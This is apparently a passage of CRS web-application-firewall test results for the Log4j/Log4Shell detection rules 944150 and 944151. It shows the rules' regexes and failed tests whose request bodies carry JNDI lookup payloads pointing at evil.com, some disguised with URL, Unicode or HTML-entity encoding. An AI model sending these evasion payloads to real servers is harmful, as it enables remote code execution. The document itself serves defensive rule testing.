          "text" : " potentially be executed on the logviewer."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule has stricter siblings: 944151 (PL2), 944152 (PL4)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944150.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944150"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)(?:[^\\}]{0,15}(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)|jndi|ctx)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944150
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944150",
    "test_id" : 24,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944150.yaml",
    "description" : "Log4J exploit on JSON with named HTML entity evasion, wrapped in Unicode escape evasion, omitting terminal semi-colon",
    "cause" : "failed expect_id check: 944150 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 24,
      "desc" : "Log4J exploit on JSON with named HTML entity evasion, wrapped in Unicode escape evasion, omitting terminal semi-colon",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"$\\u0026lbracejndi:ldap://evil.com/webshell}\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944150 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944150,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Log4J / Log4Shell Defense"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This addresses exploits against the Log4J library described in several CVEs:"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-44228"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-44832"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-45046"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-45105"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " See https://coreruleset.org/20211213/crs-and-log4j-log4shell-cve-2021-44228/"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule attempts to detect two things:"
        }, {
          "type" : "Comment",
          "text" : " * Nested use of ${"
        }, {
          "type" : "Comment",
          "text" : " * use of ${jndi:... without the closing bracket"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Rule 932130 is also essential for defense since there are certain"
        }, {
          "type" : "Comment",
          "text" : " bypasses of the log4j rules that can be caught by 932130."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " The payload is not displayed in the alert message since log4j could"
        }, {
          "type" : "Comment",
          "text" : " potentially be executed on the logviewer."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule has stricter siblings: 944151 (PL2), 944152 (PL4)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944150.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944150"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)(?:[^\\}]{0,15}(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)|jndi|ctx)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944150
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944151",
    "test_id" : 9,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944151.yaml",
    "description" : "Log4J exploit on JSON with URL encoding evasion",
    "cause" : "failed expect_id check: 944151 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 9,
      "desc" : "Log4J exploit on JSON with URL encoding evasion",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fwebshell%7D\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944151 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944151,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " This is a stricter sibling of 944150."
        }, {
          "type" : "Comment",
          "text" : " It is a re-iteration of said rule without the curly bracket distance limiter"
        }, {
          "type" : "Comment",
          "text" : " between the nested \"${\". This is prone to backtracking and therefore a potential"
        }, {
          "type" : "Comment",
          "text" : " DoS problem for backtracking regular expression engines (e.g. PCRE2), but it also avoids evasions that fill the space between the nested"
        }, {
          "type" : "Comment",
          "text" : " elements with arbitrary data."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944151.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944151"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)(?:[^\\}]*(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)|jndi|ctx)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944151
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944151",
    "test_id" : 10,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944151.yaml",
    "description" : "Log4J exploit on JSON with Unicode escape evasion, uppercase",
    "cause" : "failed expect_id check: 944151 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 10,
      "desc" : "Log4J exploit on JSON with Unicode escape evasion, uppercase",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"$\\u007Bjndi:ldap://evil.com/webshell}\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944151 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944151,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " This is a stricter sibling of 944150."
        }, {
          "type" : "Comment",
          "text" : " It is a re-iteration of said rule without the curly bracket distance limiter"
        }, {
          "type" : "Comment",
          "text" : " between the nested \"${\". This is prone to backtracking and therefore a potential"
        }, {
          "type" : "Comment",
          "text" : " DoS problem for backtracking regular expression engines (e.g. PCRE2), but it also avoids evasions that fill the space between the nested"
        }, {
          "type" : "Comment",
          "text" : " elements with arbitrary data."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944151.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944151"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)(?:[^\\}]*(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)|jndi|ctx)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944151
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944151",
    "test_id" : 11,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944151.yaml",
    "description" : "Log4J exploit on JSON with Unicode escape evasion, lowercase",
    "cause" : "failed expect_id check: 944151 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 11,
      "desc" : "Log4J exploit on JSON with Unicode escape evasion, lowercase",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"$\\u007bjndi:ldap://evil.com/webshell}\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944151 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944151,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " This is a stricter sibling of 944150."
        }, {
          "type" : "Comment",
          "text" : " It is a re-iteration of said rule without the curly bracket distance limiter"
        }, {
          "type" : "Comment",
          "text" : " between the nested \"${\". This is prone to backtracking and therefore a potential"
        }, {
          "type" : "Comment",
          "text" : " DoS problem for backtracking regular expression engines (e.g. PCRE2), but it also avoids evasions that fill the space between the nested"
        }, {
          "type" : "Comment",
          "text" : " elements with arbitrary data."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944151.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944151"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)(?:[^\\}]*(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)|jndi|ctx)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944151
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944151",
    "test_id" : 12,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944151.yaml",
    "description" : "Log4J exploit on JSON with named HTML entity evasion, lower case",
    "cause" : "failed expect_id check: 944151 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 12,
      "desc" : "Log4J exploit on JSON with named HTML entity evasion, lower case",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"$&lbrace;jndi:ldap://evil.com/webshell}\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944151 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944151,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " This is a stricter sibling of 944150."
        }, {
          "type" : "Comment",
          "text" : " It is a re-iteration of said rule without the curly bracket distance limiter"
        }, {
          "type" : "Comment",
          "text" : " between the nested \"${\". This is prone to backtracking and therefore a potential"
        }, {
          "type" : "Comment",
          "text" : " DoS problem for backtracking regular expression engines (e.g. PCRE2), but it also avoids evasions that fill the space between the nested"
        }, {
          "type" : "Comment",
          "text" : " elements with arbitrary data."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944151.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944151"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)(?:[^\\}]*(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)|jndi|ctx)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944151
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
